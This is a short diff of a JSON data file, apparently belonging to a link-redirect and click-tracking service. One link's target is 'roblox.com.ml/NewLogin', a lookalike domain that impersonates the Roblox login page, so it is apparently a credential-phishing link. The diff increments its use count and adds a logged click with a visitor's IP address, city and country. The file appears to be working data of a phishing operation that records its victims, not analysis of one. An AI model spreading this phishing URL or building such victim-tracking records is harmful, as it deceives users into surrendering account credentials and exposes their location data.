@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 664,
+    "useCount": 665,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5424,6 +5424,14 @@
         "city": "Sapporo",
         "flag": "🇯🇵",
         "countryCode": "JP"
+      },
+      {
+        "timestamp": 1777126858382,
+        "ip": "69.123.204.175",
+        "country": "United States",
+        "city": "The Bronx",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
